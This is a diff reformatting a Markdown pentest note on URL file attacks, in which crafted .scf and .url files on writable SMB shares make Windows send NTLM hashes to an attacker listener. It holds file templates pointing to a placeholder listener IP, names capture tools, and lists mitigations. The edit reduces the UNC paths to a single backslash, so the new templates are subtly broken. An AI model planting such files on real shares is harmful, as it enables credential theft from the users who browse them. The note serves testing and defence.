@@ -1,12 +1,13 @@
+
 ## Description
 
 A URL file attack is a type of network-based exploit that manipulates certain file formats to deceive systems into revealing sensitive information, such as NTLM hashes. This attack exploits the behaviour of URL files (.url), shell command files (.scf), and other file types to initiate connections to an adversary-controlled listener.
 
 An adversary generates files with specific content that directs systems to a network resource managed by the attacker. These files can be of different types, such as .url, .scf, or .lnk:
 
-* **.url File:** A shortcut file that contains a URL pointing to a remote server.
-* **.scf File:** A Shell Command File configured to initiate a connection to a remote server.
-* **.lnk File:** A Windows shortcut file crafted to point to a remote server.
+- **.url File:** A shortcut file that contains a URL pointing to a remote server.
+- **.scf File:** A Shell Command File configured to initiate a connection to a remote server.
+- **.lnk File:** A Windows shortcut file crafted to point to a remote server.
 
 The attacker distributes these malicious files to potential victims through email attachments, file-sharing services, or other means. When a victim interacts with the file (e.g., opening the file or even just viewing it within explorer), the file triggers the system to connect to the remote server specified in the file.
 
@@ -16,30 +17,30 @@ This document covers delivery through means of SMB shares.
 
 ## File Templates
 
-```Powershell 
+```Powershell
 [Shell]
 Command=2
-IconFile=\\[Listener-IP]\share\icon.ico
+IconFile=\[Listener-IP]\share\icon.ico
 [Taskbar]
 Command=ToggleDesktop
 ```
 
 ```Powershell
 [InternetShortcut]
-URL=\\[Listener-IP]\share
+URL=\[Listener-IP]\share
 ```
 
 ## Performing the Attack from Windows
 
 ### Tools Required
 
-* Inveigh: [https://github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)
-* Invoke-ShareHunter (Optional): [https://github.com/Leo4j/Invoke-ShareHunter](https://github.com/Leo4j/Invoke-ShareHunter)
+- Inveigh: <https://github.com/Kevin-Robertson/Inveigh>
+- Invoke-ShareHunter (Optional): <https://github.com/Leo4j/Invoke-ShareHunter>
 
 ### Permissions Required
 
-* Local Administrator (If using Inveigh to capture hashes)
-* Write permissions over a SMB share
+- Local Administrator (If using Inveigh to capture hashes)
+- Write permissions over a SMB share
 
 Load Inveigh and configure listener
 
@@ -76,7 +77,7 @@ From this point, various opportunity exists to perform further compromise. The c
 
 Disabling NTLM authentication within the domain is the most effective defence against this type of attack and other NTLM coercion-based attacks. However, it is understandable that disabling NTLM authentication within an enterprise may not be easily or quickly achievable for many organizations. In such cases, additional mitigations can be implemented. While these additional measures may not completely eliminate the attack vector, they can offer a degree of protection against this type of attack.
 
-Reference: [https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/active-directory-hardening-series-part-1-disabling-ntlmv1/ba-p/3934787](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/active-directory-hardening-series-part-1-disabling-ntlmv1/ba-p/3934787)
+Reference: <https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/active-directory-hardening-series-part-1-disabling-ntlmv1/ba-p/3934787>
 
 **Audit and restrict SMB share permissions**
 
@@ -84,11 +85,11 @@ URL file attacks are possible when an adversary controlled account has write acc
 
 ## References
 
-* [https://www.scip.ch/en/?labs.20210909](https://www.scip.ch/en/?labs.20210909)
-* [https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication)
+- <https://www.scip.ch/en/?labs.20210909>
+- <https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication>
 
 # Resources
 
-- https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.scf
+- <https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.scf>
 
 - [URL File Attack | Pentest Everything](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/forced-coercion/url-file-attack)
